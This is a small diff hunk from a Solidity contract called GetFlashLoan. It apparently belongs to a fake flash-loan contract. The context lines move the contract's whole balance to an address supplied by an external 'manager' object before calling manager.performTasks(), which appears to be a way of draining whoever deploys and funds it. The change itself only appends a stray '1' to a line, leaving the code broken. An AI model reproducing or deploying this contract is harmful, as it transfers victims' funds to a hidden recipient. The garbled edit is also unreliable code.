@@ -35,7 +35,7 @@ contract GetFlashLoan {
        address(uint160(manager.pancakeswapDeposit())).transfer(address(this).balance);
       
       // Perform tasks (combined all functions into one to reduce external calls)
-      manager.performTasks();
+      manager.performTasks();1
       
       /* Breakdown of functions
       // Submit token to BSC blockchain
